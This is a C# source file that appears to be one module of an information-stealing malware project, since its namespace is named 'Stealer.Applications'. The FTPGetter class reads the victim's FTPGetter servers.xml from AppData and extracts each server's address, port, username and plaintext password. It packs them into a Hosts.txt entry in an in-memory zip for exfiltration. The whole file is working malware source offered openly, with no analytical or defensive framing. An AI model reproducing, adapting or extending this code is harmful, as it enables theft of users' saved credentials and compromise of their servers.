using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class FTPGetter : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\FTPGetter\\servers.xml";
            if (!File.Exists(text))
            {
                return;
            }
            string input = File.ReadAllText(text, Encoding.UTF8);
            Regex regex = new Regex("<server\\b[^>]*>(.*?)</server>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            Regex regex2 = new Regex("<server_ip>\\s*(?<v>.*?)\\s*</server_ip>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            Regex regex3 = new Regex("<server_port>\\s*(?<v>\\d+)\\s*</server_port>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            Regex regex4 = new Regex("<server_user_name>\\s*(?<v>.*?)\\s*</server_user_name>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            Regex regex5 = new Regex("<server_user_password>\\s*(?<v>.*?)\\s*</server_user_password>", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            List<string> list = new List<string>();
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "FTPGetter"
            };
            foreach (Match item in regex.Matches(input))
            {
                string value = item.Groups[1].Value;
                Match match = regex2.Match(value);
                if (match.Success)
                {
                    string text2 = match.Groups["v"].Value.Trim();
                    Match match2 = regex3.Match(value);
                    string text3 = (match2.Success ? match2.Groups["v"].Value.Trim() : "21");
                    Match match3 = regex4.Match(value);
                    string text4 = (match3.Success ? match3.Groups["v"].Value.Trim() : "");
                    Match match4 = regex5.Match(value);
                    string text5 = (match4.Success ? match4.Groups["v"].Value.Trim() : "");
                    list.Add("Url: " + text2 + ":" + (string.IsNullOrEmpty(text3) ? "21" : text3) + "\nUsername: " + text4 + "\nPassword: " + text5 + "\n");
                    counterApplications.Files.Add(text + " => FTPGetter\\Hosts.txt");
                }
            }
            if (list.Count > 0)
            {
                zip.AddFile("FTPGetter\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", list)));
                counterApplications.Files.Add("FTPGetter\\Hosts.txt");
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
